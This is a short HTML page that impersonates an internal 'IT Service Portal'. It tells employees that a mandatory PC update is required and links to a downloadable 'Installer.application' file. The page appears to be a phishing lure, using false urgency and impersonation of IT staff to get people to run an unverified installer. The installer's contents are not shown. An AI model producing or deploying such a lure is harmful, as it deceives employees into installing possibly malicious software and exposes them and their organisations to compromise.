<html>
    <head>
        <title>IT Service Portal - PC Update</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                background: #f4f6fa;
                margin: 0;
                padding: 0;
            }
            .container {
                max-width: 400px;
                margin: 60px auto;
                background: #fff;
                border-radius: 8px;
                box-shadow: 0 2px 8px rgba(0,0,0,0.08);
                padding: 32px 24px;
            }
            h2 {
                margin-top: 0;
                color: #2d3e50;
            }
            label {
                display: block;
                margin: 16px 0 6px 0;
                color: #34495e;
            }
            input, select, button {
                width: 100%;
                padding: 8px;
                margin-bottom: 12px;
                border: 1px solid #ccc;
                border-radius: 4px;
                box-sizing: border-box;
            }
            button {
                background: #2d8cf0;
                color: #fff;
                border: none;
                cursor: pointer;
                font-size: 16px;
            }
            button:hover {
                background: #1976d2;
            }
            .update-link {
                display: block;
                text-align: center;
                background: #2d8cf0;
                color: #fff;
                padding: 14px 0;
                border-radius: 4px;
                text-decoration: none;
                font-size: 18px;
                margin-top: 24px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h2>IT Service Portal</h2>
            <p>A mandatory update is required for all employee PCs. Please click the link below to begin the update process.</p>
            <a href="Install/Installer.application" class="update-link">
                Download &amp; Install Mandatory Update
            </a>
        </div>
    </body>
</html>
